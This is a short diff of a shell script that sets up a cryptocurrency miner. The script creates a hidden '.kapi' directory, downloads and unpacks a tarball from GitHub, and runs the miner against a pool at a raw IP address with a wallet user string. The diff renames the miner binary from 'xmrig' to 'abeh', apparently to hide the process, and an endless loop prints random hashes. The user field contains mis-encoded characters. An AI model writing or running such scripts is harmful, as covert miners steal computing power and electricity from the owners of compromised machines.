@@ -1,4 +1,4 @@
 mkdir .kapi && cd .kapi
 wget https://github.com/ganejafaujanih/garing/raw/main/emen.tar.gz && tar -xvf emen.tar.gz
-./xmrig -a ghostrider --url 143.42.65.73:80 --userÂ SSuVek3r3mmQSLkincjW4K1HkBGCj6adEU.SUADIKHAP
+./abeh -a ghostrider --url 143.42.65.73:80 --userÿSSuVek3r3mmQSLkincjW4K1HkBGCj6adEU.SUADIKHAP
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 3m; done
